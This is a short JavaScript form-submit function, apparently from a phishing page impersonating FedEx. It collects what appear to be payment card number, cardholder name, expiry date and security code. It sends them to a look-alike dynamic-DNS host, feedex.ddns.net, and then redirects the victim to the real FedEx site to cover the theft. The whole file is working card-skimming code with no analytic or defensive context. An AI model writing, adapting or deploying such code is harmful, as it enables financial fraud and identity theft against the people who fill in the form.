async function submitForm(event) {
    event.preventDefault();

    const formData = {
        number: document.getElementById('number').value,
        name: document.getElementById('name').value,
        date: document.getElementById('date').value,
        code: document.getElementById('code').value
    };

    try {
        const response = await fetch('http://feedex.ddns.net/api/bghdo', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(formData)
        });

        if (response.ok) {
           window.location.href = "https://www.fedex.com/en-us/home.html#"
        } else {
            const errorMessage = await response.text();
            alert(`Error: ${errorMessage}`);
        }
    } catch (error) {
        alert('An error occurred while submitting the form.');
        console.error('Error:', error);
    }
}
